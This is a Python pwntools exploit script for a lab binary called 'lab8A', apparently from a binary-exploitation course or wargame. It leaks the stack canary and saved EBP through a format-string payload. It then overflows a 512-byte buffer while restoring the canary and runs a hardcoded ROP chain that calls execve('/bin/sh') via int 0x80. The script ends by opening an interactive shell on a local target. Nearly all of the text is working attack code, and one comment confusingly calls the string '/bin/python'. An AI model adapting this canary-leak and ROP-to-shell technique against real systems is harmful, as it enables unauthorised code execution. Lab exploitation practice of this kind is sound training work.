from pwn import *
settings = {
    "binary"        : "/tmp/lab8A",
}
def exploit():
    print("PID: "+str(pidof(p)))
    pause()
    p.sendlineafter("Enter Your Favorite Author's Last Name: ","%130$p-%131$p-HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH/bin/sh")
    leak=str(p.recvline()).split("-")
    canary=leak[0]
    EBP=leak[1]
    print("Canary: "+canary)
    print("EBP: "+EBP)
	
    canary_value = int(canary,16)
    EBP_value = int(EBP,16)
    
    binsh_addr = EBP_value - 338  	# based on leaked EBP, calculate the address of the "/bin/sh" string

    # Binary is statically compiled, we don't need to leak the code segment.
    ROP = ""

	# EDX = 0
    ROP = ROP + p32(0x80554f0) # xor eax eax ;;
    ROP = ROP + p32(0x8055485) # 0x8055485L: mov edx 0xffffffff ;; 
    ROP = ROP + p32(0x805d997) # 0x805d997L: inc edx ;;

    # EAX = 0xb without using a nullbyte in the string
    ROP = ROP + p32(0x80554f0) # xor eax eax ;; -> EAX = 0
    # followed by 11 "inc eax" instructions
    ROP = ROP + p32(0x80ea08b) # inc eax ;; 
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;

    # ECX = 0
    ROP = ROP + p32(0x80e71c5) # pop ecx ;;
    ROP = ROP + p32(0x1)	   # ECX = 0x1
    ROP = ROP + p32(0x80e3e19) # dec ecx;; -> ECX = 0
    

    # EBX = "/bin/sh"
    ROP = ROP + p32(0x804fb14) # pop ebx ;;
    ROP = ROP + p32(binsh_addr) #	// the address of /bin/python - just in case use the dynamically calculated one instead of this sample fixed one

	# INT 0x80
    ROP = ROP + p32(0x806f8ff) # int 0x80

    payload = "B"*512	# overflow the buf[512] in the second selectABook() call, overwrite the canary with itself and put the ROP in place
    payload = payload + p32(canary_value) + p32(EBP_value) + ROP + p8(0x0)
    p.sendlineafter("What were you thinking, that isn't a good book.",payload)
	# Send "A" to convince the third call of selectABook() to call readA() and return instead of calling itself again (prevent further recurrence).
    p.sendlineafter("What were you thinking, that isn't a good book.","A")
    p.interactive()
	
    return 0
# Initial setup
if __name__  == "__main__":
    binary = ELF(settings['binary'])
    context.log_level = 'debug'
    #p = process(binary.path,stdin=PTY)
    p = remote("127.0.0.1", 8841)
    exploit()